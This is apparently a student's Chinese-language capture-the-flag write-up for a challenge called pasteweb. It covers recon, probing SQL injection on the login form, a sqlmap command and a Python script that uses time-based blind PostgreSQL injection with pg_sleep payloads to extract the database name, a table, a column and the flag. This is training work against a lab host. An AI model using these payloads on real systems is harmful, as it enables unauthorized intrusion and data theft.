# hw_pasteweb1

1. 首先，先偵蒐一些網站的資訊，跟隨意做一些嘗試 :
    
    a. 先搜集網站資訊，嘗試發一個 request ，可以發現網站是 使用 nginx/1.18.0 ，並建置在 Ubuntu 上面。
    
    ![截圖 2022-12-18 下午2.45.21.png](hw_pasteweb1%200dddbec36c3649c4a6c162fc1870fc40/%25E6%2588%25AA%25E5%259C%2596_2022-12-18_%25E4%25B8%258B%25E5%258D%25882.45.21.png)
    
    b. 使用 dirsearch 去做目錄的爬取，首先可以看到 ./git 系列的都不能存取，error 301，看起來是被搬去其他地方。
    
    ![截圖 2022-12-18 下午2.31.23.png](hw_pasteweb1%200dddbec36c3649c4a6c162fc1870fc40/%25E6%2588%25AA%25E5%259C%2596_2022-12-18_%25E4%25B8%258B%25E5%258D%25882.31.23.png)
    
    c. 嘗試去XSS，但都失敗。
    
    ![截圖 2022-12-18 下午2.45.21.png](hw_pasteweb1%200dddbec36c3649c4a6c162fc1870fc40/%25E6%2588%25AA%25E5%259C%2596_2022-12-18_%25E4%25B8%258B%25E5%258D%25882.45.21.png)
    
    d. 去使用SQL injection 看一些網站返回資訊
    
    使用 `admin' or 1=1 --` 會回覆 When do you came form?
    
    ![截圖 2022-12-18 下午3.11.45.png](hw_pasteweb1%200dddbec36c3649c4a6c162fc1870fc40/%25E6%2588%25AA%25E5%259C%2596_2022-12-18_%25E4%25B8%258B%25E5%258D%25883.11.45.png)
    
    `admin' or '1'='1`  會回覆 Bad hacker!
    
    ![截圖 2022-12-18 下午10.05.42.png](hw_pasteweb1%200dddbec36c3649c4a6c162fc1870fc40/%25E6%2588%25AA%25E5%259C%2596_2022-12-18_%25E4%25B8%258B%25E5%258D%258810.05.42.png)
    
    大致上整理錯誤資訊，可以得到以下幾種，可以猜測這邊有 SQL injection 可以嘗試，於是開始往這個方向去研究。
    
    1. Login error
    2. Bad hacker
    3. When do you came from
    
2. 現在往 SQL injection 的方向研究，首先要知道 SQL 的種類，但 SQL 很多種，網站返回的資訊好像也不足以可以去判斷，於是上網搜尋一些做法，甚至將 sql-injection-payload-list( 如下面連結）裡面的 payload 都嘗試過一遍，但都沒什麼好的效果。後來發現這邊有個很好用的工具是 sqlmap ，於是才開始去研究使用方法，這邊一開始都直失敗，也判斷不出來種類 SQL 種類。

[https://github.com/payloadbox/sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list)

![截圖 2022-12-18 下午9.50.35.png](hw_pasteweb1%200dddbec36c3649c4a6c162fc1870fc40/%25E6%2588%25AA%25E5%259C%2596_2022-12-18_%25E4%25B8%258B%25E5%258D%25889.50.35.png)

1. 後來就一直在研究 SQL injection ，直到看到 OWSAP 提到  Blind_SQL_Injection

[https://owasp.org/www-community/attacks/Blind_SQL_Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)，才想到也許這邊也可以用這種方式，然後將 sqlmap 改為以下這一段指令，可以去測出 blind sql injection，他有成功給我 Postgrel SQL 的 payload，實際測試後，真的可以 sleep(5) 的時間，到這邊可以確定 SQL 是 postgreSQL。

```bash
sqlmap -u [https://pasteweb.ctf.zoolab.org](https://pasteweb.ctf.zoolab.org/) --data="POST_STRING_HERE*" --dbs --batch --technique=T -v 3
```

![截圖 2022-12-19 下午2.40.35.png](hw_pasteweb1%200dddbec36c3649c4a6c162fc1870fc40/%25E6%2588%25AA%25E5%259C%2596_2022-12-19_%25E4%25B8%258B%25E5%258D%25882.40.35.png)

1. 接下來我去研究 Postgrel SQL 的語法，我的想法是
    
    a. 湊出一段 SQL 語法可以去判斷 (x, y) 欄位字串如果是 admin ，那(x, y+1) 就很有可能是admin 的 password。
    
    b. 然後再用 time-based side channel attack，直接去爆破出 password ( 這會需要額外寫一段 payload )，這邊要先去理解 Postgrel SQL 的語法 ，不然寫不出這一段 SQL injection 的 payload
    

1. 實際開始寫的時候，參考了網路的一些做法，會發現需要先爆破出 Database_name ，然後爆破 Table_name ，然後再去爆破出 column name 才可以去取得 column 裡面的值，於是我參考它給的 code 去寫 payload 。
    
    ![截圖 2022-12-22 上午12.29.52.png](hw_pasteweb1%200dddbec36c3649c4a6c162fc1870fc40/%25E6%2588%25AA%25E5%259C%2596_2022-12-22_%25E4%25B8%258A%25E5%258D%258812.29.52.png)
    

[PayloadsAllTheThings/PostgreSQL Injection.md at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-list-columns)

1. 於是有了以下的爆破過程，就是直接用  time-based side channel attack ，將每個字跟 SQL 裡面讀取到的值的字元一個一個的比對，並設置 timeout = 1 ，如果字元比對一樣就 sleep 1.5 s，如果不一樣就會直接試下一個字，如果有一個 timeout 出現，就代表這是我們要爆破的那個字。中間其實還是有爆出一些其他地方，及一些奇怪的東西，還有爆破到另外一個 table 是下一題的密碼，但這邊列出主要的幾個跟這題有關的爆破。
    
    
    a.先爆破出 Database name，然後爆出了 pastewebdb。
    
    ```python
    import requests
    from string import printable 
    from time import time
    
    url = 'https://pasteweb.ctf.zoolab.org/'
    Result = ""
    
    for i in range(1, 15):
        for j in printable:
            print(i, j)
            #Datebase_Name
            payload = f"select case when substr(current_database(),{i},1)='{j}' then pg_sleep(2) else pg_sleep(0) end from pg_database limit 1"
    
            #Table_name
            payload = f"select case when substring(table_name,{k},1)='{i}' then pg_sleep(2) else pg_sleep(0) end from information_schema.tables order by table_name"
    
            #FLAG
            #payload = f" select case when substring(fl4g,{i},1)='{j}' then pg_sleep(1.5) else pg_sleep(0) end from s3cr3t_t4b1e"
    
            username = f"1' ;" + payload  + "; -- -"
            current_time = int(time())
            value = {
                'username': username,
                'password': '',
                'current_time': current_time
            }
            try :
                r = requests.post(url, data=value, timeout=1)
            except : 
                print("error")
                Result += j
                break
    
        print("Answer : ", Result)
    ```
    
    b. 將 payload 修改，爆破出 Table name : s3cr3t_t4b1e 。
    
    ```python
    payload = f"select case when substring(table_name,{k},1)='{i}' then pg_sleep(2) else pg_sleep(0) end from information_schema.tables order by table_name"
    ```
    
    c. 一樣修改 payload ，爆破出 Column name : fl4g 。
    
    ```python
    payload = f"select case when substring(column_name,{k},1)='{i}' then pg_sleep(2) else pg_sleep(0) end from information_schema.columns where table_name='s3cr3t_t4b1e'  ;"
    ```
    
    d. 然後再爆破出 Column 裡面的值，就成功取得FLAG{B1inD_SqL_IiIiiNj3cT10n}。
    
    ```python
    payload = f" select case when substring(fl4g,{i},1)='{j}' then pg_sleep(1.5) else pg_sleep(0) end from s3cr3t_t4b1e"
    ```
    
    ![截圖 2022-12-22 上午1.32.54.png](hw_pasteweb1%200dddbec36c3649c4a6c162fc1870fc40/%25E6%2588%25AA%25E5%259C%2596_2022-12-22_%25E4%25B8%258A%25E5%258D%25881.32.54.png)
    

Reference : 

1. [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/PostgreSQL Injection.md#postgresql-list-columns](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-list-columns)
2. [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL Injection/PostgreSQL Injection.md#postgresql-list-columns](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-list-columns)